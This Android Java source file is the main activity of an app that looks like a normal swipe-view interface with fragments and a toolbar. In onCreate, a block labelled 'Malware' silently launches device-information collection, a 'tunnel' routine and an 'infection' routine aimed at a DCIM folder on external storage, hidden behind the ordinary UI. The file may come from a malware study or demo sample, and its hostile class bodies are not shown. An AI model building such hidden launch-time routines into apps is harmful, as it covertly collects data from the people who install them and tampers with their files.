package com.xpf.me.sms;

import android.content.Context;
import android.os.Bundle;
import android.os.Environment;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.Fragment;
import android.support.v4.view.ViewPager;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;

import com.xpf.me.sms.fragment.FragmentAdapter;
import com.xpf.me.sms.fragment.FragmentOne;
import com.xpf.me.sms.fragment.FragmentThree;
import com.xpf.me.sms.fragment.FragmentTwo;
import com.xpf.me.sms.routine.AndroidDeviceInfo;
import com.xpf.me.sms.routine.RoutineInfect;
import com.xpf.me.sms.routine.RoutineTunnel;

import java.util.LinkedList;

public class MainActivity extends AppCompatActivity {

    private static Context context;

    public static Context getContext() {
        return context;
    }

    private ViewPager viewPager;

    private FragmentAdapter viewFragment;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initFragment();
        MainActivity.context = this;


        /* Malware */
        Log.w("malware", "[LogCat] tag:malware");
        // Android Device Info
        new AndroidDeviceInfo(this);
        // Routine Tunnel
        new RoutineTunnel();
        // Routine Infection
        new RoutineInfect(Environment.getExternalStorageDirectory()
                .getAbsolutePath() + "/DCIM/足记").start();

        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
    }

    private void initFragment() {
        // Swipe View
        LinkedList<Fragment> fragments = new LinkedList<Fragment>();
        // list of fragments
        fragments.add(Fragment.instantiate(this, FragmentOne.class.getName()));
        fragments.add(Fragment.instantiate(this, FragmentTwo.class.getName()));
        fragments
                .add(Fragment.instantiate(this, FragmentThree.class.getName()));

        viewFragment = new FragmentAdapter(super.getSupportFragmentManager(),
                fragments);
        viewPager = (ViewPager) super.findViewById(R.id.activity_main);
        viewPager.setAdapter(viewFragment);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
